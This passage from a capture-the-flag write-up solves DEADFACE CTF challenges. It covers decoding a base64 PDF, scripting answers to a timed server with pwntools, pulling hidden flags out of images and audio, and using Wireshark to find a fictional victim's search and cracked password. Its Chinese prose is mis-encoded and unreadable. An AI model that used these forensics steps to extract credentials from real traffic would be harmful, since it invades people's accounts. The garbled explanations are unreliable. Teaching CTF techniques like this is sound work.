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
TAF1CEKakKpr5ERAAhYs3TeZe2TV2GZP6dO/xRvLlSSnCWXM8nymiDw7KCUTJiJigIlEDBZKJRtw
aEybaZGwWnjRf4o1QiJwiIrik7NHgqQAAAAaAm7lLukvyDKC4OzhKTo9LGARBJFdJVQQCyIgUphG
2agyq5zmmfPd7nLJUlqSw5SmmIHTQA5jlE1ETANAqhiiBiRARKICAwt7a5SXMubEjPhJQkxxK7vB
AMBVCnVMIAYBKIQMcQthwjTbQoIHAKAgAg8CqGSQKVQEBBEBEBeQUHJlkc7yztlR+kOci8jPAHRX
MdOTkAO8HTTSMkoAqGKmIlOcY4LYAAsRi13lOc8tusgucruMhvDy8vJgrzhBQFkSwMIiaCYmjEAs
UbtrKxjlZQSBmRyauTIuAimLKgPOyRZrKc8J2S84LyUSZryQzykZMDvIKmSLSCjSgd3SCIRsX0DW
Op3N5+m1NwjjKUAeVV1FzplEDgnTAoASICICMCxGFhrOxgJIoAmcAAItgT3ZBTQRcoog7iCBZ1Vi
fZKeJupO5HlI72m/kEiRDlOoECqFPEAERAAjZw7XuShWNJbmZ4CCouqIqANgQNQLS7VoMlTmaBJS
NKpnIVXgyxlxrqiqidMxqQmEomgNkbYYg1mYakaICqccAi0BAEEAIcmcAgoaaIA3RFEjGMYQv//S
1VjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMI
RjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIX/2Q0K
ZW5kc3RyZWFtDWVuZG9iag0xIDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCAxNC9M
ZW5ndGggMTI2L04gMy9UeXBlL09ialN0bT4+c3RyZWFtDQpo3jJTMFAwVzCxVLBQsDRSsLHRd84v
zStRMNR3yywqLgFKGSgE6fskwpkhlQWp+v6lJTmZeanFdnZADY5ArSCZgMSiVKBOM4iyzJKcVA2n
nMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh
bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh
Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr
YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl
IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg
Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk
Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg
ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg
ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg
IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg
ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w
Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg
ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl
YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w
NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB
Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg
ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN
TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94
bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi
LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg
PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w
ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4
bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0
ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N
CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0
cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg
MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo
kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+
odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq
DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy
L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC
MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx
MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7
QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0
eHJlZg0KMTE2DQolJUVPRg0K
</code></pre>
<p>åœ¨æœ¬åœ°è§£ç ,ä¿å­˜è‡³<code>flag.pdf</code></p>
<pre><code class="shell">~$ base64 -d encoded &gt; flag.pdf
</code></pre>
<p><strong>flag:</strong><code>flag&#123;deM0nn3_dat4_4_us&#125;</code></p>
<h1 id="The-Count"><a href="#The-Count" class="headerlink" title="The Count"></a>The Count</h1><p><em>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He&#39;s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as <code>flag&#123;SHA256_hash&#125;</code>.</em></p>
<p><em><a href="https://ghosttown.deadface.io/t/what-programming-needs-are-there/56/4">Link to Thread</a></em></p>
<p><em>code.deadface.io:50000</em></p>
<hr>
<p>ä½¿ç”¨ncå‘½ä»¤è¿æ¥æœåŠ¡å™¨</p>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACE
â•°â”€$ nc code.deadface.io 50000
DEADFACE gatekeeper: Let us see how good your programming skills are.
If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:

 You have 5 seconds to give me an answer.

Your word is: tightfisted
Too slow!! Word has been reset!
</code></pre>
<p>æˆ‘ä»¬å–æ¯ä¸€ä½å­—ç¬¦çš„ASCIIç åå‡å»97,æ±‚å’Œå³å¯</p>
<pre><code class="python">from pwn import *

p = remote(&#39;code.deadface.io&#39;, 50000)

x = p.recvline_contains(b&#39;Your word&#39;)
word = x.decode().rsplit(&#39;:&#39;)[-1].strip()
count = sum([ord(x)-97 for x in word])
p.send(str(count).encode())
print(p.recvline())
print(p.recvline())
print(p.recvline())

</code></pre>
<p><strong>flag:</strong><code>flag&#123;d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944&#125;</code></p>
<h1 id="Behind-the-Curtain"><a href="#Behind-the-Curtain" class="headerlink" title="Behind the Curtain"></a>Behind the Curtain</h1><p><em>This image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn&#39;t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}.</em></p>
<p><em><a href="https://tinyurl.com/26fd4pbs">Link to Image</a></em></p>
<p><em>SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2</em></p>
<hr>
<p>ä½¿ç”¨<code>Stegsolve</code>æ‰“å¼€å›¾ç‰‡,é€‰æ‹©<code>Frame Browser</code>,åœ¨Frame 2å³å¯çœ‹åˆ°flag<br><img data-src="/../../CTF/DEADFACECTF/Steganography/images/Behind_the_Curtain.png" alt="Behind the Curtain"></p>
<p><strong>flag:</strong><code>flag&#123;L3t_m3_in&#125;</code></p>
<h1 id="Scary-Bunny"><a href="#Scary-Bunny" class="headerlink" title="Scary Bunny"></a>Scary Bunny</h1><p><em>What could be inside this creepy rabbit?</em></p>
<p><em><a href="https://tinyurl.com/4csyne6s">Download image</a></em></p>
<p><em>SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1</em></p>
<hr>
<p>ä½¿ç”¨<code>steghide info</code>æŸ¥çœ‹å›¾ç‰‡éšå†™ä¿¡æ¯</p>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACE
â•°â”€$ steghide info bunny.jpg
&quot;bunny.jpg&quot;:
  format: jpeg
  capacity: 2.7 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file &quot;steganopayload730241.txt&quot;:
    size: 13.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
</code></pre>
<p>ä½¿ç”¨<code>steghide extract</code>æå–éšå†™çš„æ–‡ä»¶<code>steganopayload730241.txt</code></p>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACE
â•°â”€$ steghide extract -sf bunny.jpg
Enter passphrase:
the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y
wrote extracted data to &quot;steganopayload730241.txt&quot;.

â•­â”€ ~/CTF/DEADFACE
â•°â”€$ cat steganopayload730241.txt
flag&#123;Carr0t&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;Carr0t&#125;</code></p>
<h1 id="Send-in-the-Clowns"><a href="#Send-in-the-Clowns" class="headerlink" title="Send in the Clowns"></a>Send in the Clowns</h1><p><em>There is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}.</em></p>
<p><em><a href="https://tinyurl.com/y9xjz7b4">Link to Image</a><br>SHA1: 74eaae618bf508ef2715533bfdff3153dd996e89</em></p>
<hr>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACE
â•°â”€$ strings steg02.jpg |grep flag
flag&#123;s3nd_in_the_kl0wns&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;s3nd_in_the_kl0wns&#125;</code></p>
<h1 id="V0icE"><a href="#V0icE" class="headerlink" title="V0icE"></a>V0icE</h1><p><em>A friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can&#39;t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends.</em></p>
<p><em><a href="https://tinyurl.com/2sa56kbk">Download file</a></em></p>
<p><em>SHA1:3173700e9ba2f062a18707b375fac61049310413</em></p>
<hr>
<p>ç”¨<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>æ‰“å¼€<code>midnight.wav</code>,ç‚¹å‡»<code>Layer</code>-&gt;<code>Add Spectrogram</code>-&gt;<code>midnight.wav: All Channels Mixed</code></p>
<p><img data-src="/../../CTF/DEADFACECTF/Steganography/images/V0icE_01.png" alt="V0icE"></p>
<p>æ”¾å¤§åå³å¯çœ‹åˆ°éšè—åœ¨é¢‘è°±å›¾çš„flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Steganography/images/V0icE_02.png" alt="V0icE"></p>
<p><strong>flag:</strong><code>flag&#123;1257&#125;</code></p>
<h1 id="A-Warning"><a href="#A-Warning" class="headerlink" title="A Warning"></a>A Warning</h1><p><em>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.</em></p>
<p><em>One of them says: &quot;Stay away from Lytton Labs... you have been warned.&quot;</em></p>
<p><em>To find the flag, find the message. You&#39;ll know it when you see it. Submit the flag as <code>flag&#123;flag-goes-here&#125;</code>.</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>ä½¿ç”¨<a href="https://www.wireshark.org/download.html">Wireshark</a>æ‰“å¼€<code>pcap-challenge-final.pcapng</code>æ–‡ä»¶,æœç´¢â€œwarningâ€,æ‰¾åˆ°ä¸€ä¸ªè¯·æ±‚<code>da-warning-message.jpg</code>çš„HTTPè¯·æ±‚</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning.png" alt="A-Warning"></p>
<p>æ‰¾åˆ°è¯¥è¯·æ±‚å¯¹åº”å“åº”çš„æ•°æ®åŒ…(16050),å¯¹ç€&quot;JPEG File Interchange Format&quot;å³é”®,é€‰æ‹©&quot;æ˜¾ç¤ºåˆ†ç»„å­—èŠ‚&quot;,å³å¯çœ‹åˆ°flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-02.png" alt="image-20211106204519981"></p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-03.png" alt="image-20211106205413070"></p>
<p><strong>flag:</strong><code>flag&#123;angels-fear-to-tread&#125;</code></p>
<h1 id="Monster-from-the-Machine"><a href="#Monster-from-the-Machine" class="headerlink" title="Monster from the Machine"></a>Monster from the Machine</h1><p><em>Our person on the &quot;inside&quot; of Ghost Town was able to plant a packet sniffing device on Luciafer&#39;s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.</em></p>
<p><em>We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.</em></p>
<p><em>To gather some information on the victim, investigate the victim&#39;s computer activity. The &quot;victim&quot; was using a search engine to look up a name. Provide the name with standard capitalization: <code>flag&#123;Jerry Seinfeld&#125;</code>.</em></p>
<p><em><a href="https://tinyurl.com/35a45kc3">Download file</a></em></p>
<p><em>SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c</em></p>
<hr>
<p>ä½¿ç”¨<a href="https://www.wireshark.org/download.html">Wireshark</a>æ‰“å¼€<code>pcap-challenge-final.pcapng</code>æ–‡ä»¶,æŒ‰ç…§<code>HTTP</code>è¿‡æ»¤</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine-00.png" alt="Monstrum ex Machine"><br>å³é”®,ç‚¹å‡»&quot;è·Ÿè¸ªæµ&quot;-&gt;&quot;HTTPæµ&quot;<br><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine.png" alt="Monstrum ex Machine"></p>
<p><strong>flag:</strong><code>flag&#123;Charles Geschickter&#125;</code></p>
<h1 id="Release-the-Crackin"><a href="#Release-the-Crackin" class="headerlink" title="Release the Crackin&#39;!"></a>Release the Crackin&#39;!</h1><p><em>Luciafer cracked a password belonging to the victim. Submit the flag as: <code>flag&#123;password&#125;</code>.</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>ä½¿ç”¨<a href="https://www.wireshark.org/download.html">Wireshark</a>æ‰“å¼€<code>pcap-challenge-final.pcapng</code>æ–‡ä»¶,æœç´¢<code>logged</code>,æ‰¾åˆ°æ­£ç¡®çš„å¯†ç </p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/release_the_crackin.png" alt="Release the Crackin"></p>
<p><strong>flag:</strong><code>flag&#123;darkangel&#125;</code></p>
<h1 id="The-SUM-of-All-FEARS"><a href="#The-SUM-of-All-FEARS" class="headerlink" title="The SUM of All FEARS"></a>The SUM of All FEARS</h1><p><em>After hacking a victim&#39;s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).</em></p>
<p><em>What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>Luciaferä¸‹è½½äº†ä¸¤ä¸ªå…·æœ‰ç›¸åŒåç§°çš„äºŒè¿›åˆ¶æ–‡ä»¶(åˆ†åˆ«ä»¥.exeå’Œ.binç»“å°¾),ä¸¤ä¸ªæ–‡ä»¶çš„md5å€¼æ‹¼æ¥åå³ä¸ºflag</p>
<p>ä½¿ç”¨<a href="https://www.wireshark.org/download.html">Wireshark</a>åˆ†æ<code>pcap-challenge-final.pcapng</code>æ–‡ä»¶,å‘ç°æ˜¯ä¸‹è½½äº†<code>lytton-crypt.exe</code>å’Œ<code>lytton-crypt.bin</code>ä¸¤ä¸ªæ–‡ä»¶</p>
<p>é€‰ä¸­ä¸€ä¸ªæ¥æ”¶<code>lytton-crypt.exe</code>æ–‡ä»¶çš„æ•°æ®åŒ…,å³é”®ç‚¹å‡»â€œè·Ÿè¸ªæµâ€-&gt;&quot;TCPæµ&quot;</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-01.png" alt="lytton-crypt"></p>
<p>ç„¶åç‚¹å‡»â€œå¦å­˜ä¸ºâ€,ä¿å­˜ä¸º<code>lytton-crypt.exe</code></p>
